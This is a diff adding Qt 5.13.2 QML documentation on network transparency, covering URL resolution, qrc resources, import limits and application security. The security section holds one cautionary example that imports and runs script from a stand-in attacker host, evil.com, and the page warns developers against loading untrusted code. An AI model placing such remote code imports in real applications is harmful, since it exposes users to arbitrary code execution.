@@ -1,0 +1,134 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<!-- networktransparency.qdoc -->
+  <title>Resource Loading and Network Transparency | Qt QML 5.13.2</title>
+  <link rel="stylesheet" type="text/css" href="style/offline-simple.css" />
+  <script type="text/javascript">
+    document.getElementsByTagName("link").item(0).setAttribute("href", "style/offline.css");
+    // loading style sheet breaks anchors that were jumped to before
+    // so force jumping to anchor again
+    setTimeout(function() {
+        var anchor = location.hash;
+        // need to jump to different anchor first (e.g. none)
+        location.hash = "#";
+        setTimeout(function() {
+            location.hash = anchor;
+        }, 0);
+    }, 0);
+  </script>
+</head>
+<body>
+<div class="header" id="qtdocheader">
+  <div class="main">
+    <div class="main-rounded">
+      <div class="navigationbar">
+        <table><tr>
+<td ><a href="../qtdoc/index.html">Qt 5.13</a></td><td ><a href="qtqml-index.html">Qt QML</a></td><td >Resource Loading and Network Transparency</td></tr></table><table class="buildversion"><tr>
+<td id="buildversion" width="100%" align="right"><a href="qtqml-index.html">Qt 5.13.2 Reference Documentation</a></td>
+        </tr></table>
+      </div>
+    </div>
+<div class="content">
+<div class="line">
+<div class="content mainContent">
+<div class="sidebar">
+<div class="toc">
+<h3><a name="toc">Contents</a></h3>
+<ul>
+<li class="level1"><a href="#relative-vs-absolute-urls">Relative vs. Absolute URLs</a></li>
+<li class="level1"><a href="#qrc-resources">QRC Resources</a></li>
+<li class="level1"><a href="#limitations">Limitations</a></li>
+<li class="level1"><a href="#implications-for-application-security">Implications for Application Security</a></li>
+</ul>
+</div>
+<div class="sidebar-content" id="sidebar-content"></div></div>
+<h1 class="title">Resource Loading and Network Transparency</h1>
+<span class="subtitle"></span>
+<!-- $$$qtqml-documents-networktransparency.html-description -->
+<div class="descr"> <a name="details"></a>
+<p>QML supports network transparency by using URLs (rather than file names) for all references from a QML document to other content. This means that anywhere a URL source is expected, QML can handle remote resources as well as local ones, for example in the following image source:</p>
+<pre class="qml">
+
+  <span class="type"><a href="../qtquick/qml-qtquick-image.html">Image</a></span> {
+      <span class="name">source</span>: <span class="string">&quot;http://www.example.com/images/logo.png&quot;</span>
+  }
+
+</pre>
+<p>Since a <i>relative</i> URL is the same as a relative file, development of QML on regular file systems remains simple:</p>
+<pre class="qml">
+
+  <span class="type"><a href="../qtquick/qml-qtquick-image.html">Image</a></span> {
+      <span class="name">source</span>: <span class="string">&quot;images/logo.png&quot;</span>
+  }
+
+</pre>
+<p>Network transparency is supported throughout QML, for example, both the <a href="../qtquick/qml-qtquick-fontloader.html">FontLoader</a> and Image elements support loading resources from a remote server.</p>
+<p>Even QML types themselves can be on the network - if the <a href="../qtdoc/qtquick-qmlscene.html">Prototyping with qmlscene</a> is used to load <code>http://example.com/mystuff/Hello.qml</code> and that content refers to a type &quot;World&quot;, the engine will load <code>http://example.com/mystuff/qmldir</code> and resolve the type just as it would for a local file. For example if the qmldir file contains the line &quot;World World.qml&quot;, it will load <code>http://example.com/mystuff/World.qml</code> Any other resources that <code>Hello.qml</code> referred to, usually by a relative URL, would similarly be loaded from the network.</p>
+<a name="relative-vs-absolute-urls"></a>
+<h2 id="relative-vs-absolute-urls">Relative vs. Absolute URLs</h2>
+<p>Whenever an object has a property of type URL (<a href="../qtcore/qurl.html">QUrl</a>), assigning a string to that property will actually assign an absolute URL - by resolving the string against the URL of the document where the string is used.</p>
+<p>For example, consider this content in <code>http://example.com/mystuff/test.qml</code>:</p>
+<pre class="qml">
+
+  <span class="type"><a href="../qtquick/qml-qtquick-image.html">Image</a></span> {
+      <span class="name">source</span>: <span class="string">&quot;images/logo.png&quot;</span>
+  }
+
+</pre>
+<p>The <a href="../qtquick/qml-qtquick-image.html">Image</a> source property will be assigned <code>http://example.com/mystuff/images/logo.png</code>, but while the QML is being developed, in say <code>C:\User\Fred\Documents\MyStuff\test.qml</code>, it will be assigned <code>C:\User\Fred\Documents\MyStuff\images\logo.png</code>.</p>
+<p>If the string assigned to a URL is already an absolute URL, then &quot;resolving&quot; does not change it and the URL is assigned directly.</p>
+<a name="qrc-resources"></a>
+<h2 id="qrc-resources">QRC Resources</h2>
+<p>One of the URL schemes built into Qt is the &quot;qrc&quot; scheme. This allows content to be compiled into the executable using <a href="../qtcore/resources.html">The Qt Resource System</a>. Using this, an executable can reference QML content that is compiled into the executable:</p>
+<pre class="cpp">
+
+  <span class="type"><a href="../qtquick/qquickview.html">QQuickView</a></span> <span class="operator">*</span>view <span class="operator">=</span> <span class="keyword">new</span> <span class="type"><a href="../qtquick/qquickview.html">QQuickView</a></span>;
+  view<span class="operator">-</span><span class="operator">&gt;</span>setUrl(<span class="type"><a href="../qtcore/qurl.html">QUrl</a></span>(<span class="string">&quot;qrc:/dial.qml&quot;</span>));
+
+</pre>
+<p>The content itself can then use relative URLs, and so be transparently unaware that the content is compiled into the executable.</p>
+<a name="limitations"></a>
+<h2 id="limitations">Limitations</h2>
+<p>The <code>import</code> statement is only network transparent if it has an &quot;as&quot; clause.</p>
+<p>More specifically:</p>
+<ul>
+<li><code>import &quot;dir&quot;</code> only works on local file systems</li>
+<li><code>import libraryUri</code> only works on local file systems</li>
+<li><code>import &quot;dir&quot; as D</code> works network transparently</li>
+<li><code>import libraryUrl as U</code> works network transparently</li>
+</ul>
+<a name="implications-for-application-security"></a>
+<h2 id="implications-for-application-security">Implications for Application Security</h2>
+<p>The QML security model is that QML content is a chain of trusted content: the user installs QML content that they trust in the same way as they install native Qt applications, or programs written with runtimes such as Python and Perl. That trust is establish by any of a number of mechanisms, including the availability of package signing on some platforms.</p>
+<p>In order to preserve the trust of users, QML application developers should not load and execute arbitrary JavaScript or QML resources. For example, consider the QML code below:</p>
+<pre class="qml">
+
+  import QtQuick 2.0
+  import &quot;http://evil.com/evil.js&quot; as Evil
+
+  <span class="type"><a href="qml-qtqml-component.html">Component</a></span> {
+      <span class="name">onLoaded</span>: <span class="name">Evil</span>.<span class="name">doEvil</span>()
+  }
+
+</pre>
+<p>This is equivalent to downloading and executing &quot;http://evil.com/evil.exe&quot;. <b>The QML engine will not prevent particular resources from being loaded</b>. Unlike JavaScript code that is run within a web browser, a QML application can load remote or local filesystem resources in the same way as any other native applications, so application developers must be careful in loading and executing any content.</p>
+<p>As with any application accessing other content beyond its control, a QML application should perform appropriate checks on any untrusted data it loads. <b>Do not, for example, use <code>import</code>, <a href="../qtquick/qml-qtquick-loader.html">Loader</a> or <a href="qtqml-javascript-qmlglobalobject.html#xmlhttprequest">XMLHttpRequest</a> to load any untrusted code or content.</b></p>
+</div>
+<!-- @@@qtqml-documents-networktransparency.html -->
+        </div>
+       </div>
+   </div>
+   </div>
+</div>
+<div class="footer">
+   <p>
+   <acronym title="Copyright">&copy;</acronym> 2019 The Qt Company Ltd.
+   Documentation contributions included herein are the copyrights of
+   their respective owners.<br/>    The documentation provided herein is licensed under the terms of the    <a href="http://www.gnu.org/licenses/fdl.html">GNU Free Documentation    License version 1.3</a> as published by the Free Software Foundation.<br/>    Qt and respective logos are trademarks of The Qt Company Ltd.     in Finland and/or other countries worldwide. All other trademarks are property
+   of their respective owners. </p>
+</div>
+</body>
+</html>
